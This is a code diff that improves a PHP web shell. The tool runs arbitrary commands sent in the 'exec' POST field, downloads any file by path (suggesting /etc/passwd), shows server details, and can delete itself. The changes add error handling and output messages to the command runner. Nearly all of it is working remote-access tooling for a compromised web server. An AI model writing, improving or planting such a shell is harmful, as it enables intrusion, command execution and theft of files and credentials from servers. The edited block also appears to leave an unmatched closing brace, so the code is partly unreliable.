@@ -23,6 +23,7 @@ if ($use_auth)
 			<p><i>%s Server: <b>%s</b> Port: <b>%s</b></i></p>
 			",
 			$_SERVER["REQUEST_URI"],
+			$_SERVER["SERVER_SOFTWARE"],
 			$_SERVER["SERVER_ADDR"],
 			$_SERVER["SERVER_PORT"]
 			)
@@ -54,9 +55,15 @@ if (isset($_POST["exec"]))
 	$command = $_POST["exec"];
 
 	$output = null;
+	$result = null;
 	$result_code = null;
 
-	$result = exec($command, $output, $result_code);
+	try {
+		$result = exec($command, $output, $result_code);
+	} catch (Error $e) {
+		$result = $e;
+	}
+}
 }
 
 if (isset($_POST["kill"])) { unlink(__FILE__); }
@@ -179,6 +186,7 @@ echo( sprintf("
 	<label for="download">File:</label>
 	<input type="text" id="download" name="download" placeholder="/etc/passwd">
 	<input type="submit" value="Download">
+	<b>Info:</b> enter full file path.
 </form>
 
 <form action="<? echo($shell); ?>" method="POST">
@@ -187,7 +195,15 @@ echo( sprintf("
 	<input type="submit" value="Execute">
 </form>
 
-<textarea rows="4" cols="64"><?php if (isset($result)) { echo(($result == FALSE) ? "Command not found..." : implode("\n", $output)); } ?></textarea>
+<textarea rows="4" cols="64"><?php
+if (isset($result))
+{
+	if (is_object($result)) { echo("[-] error: command contains null bytes"); }
+	if (is_bool($result)) { echo("[-] error: command not found"); }
+
+	if (is_string($result)) { echo(implode("\n", $output)); }
+}
+?></textarea>
 
 <form action="<? echo($shell); ?>" method="POST">
 	<input type="hidden" id="kill" name="kill">
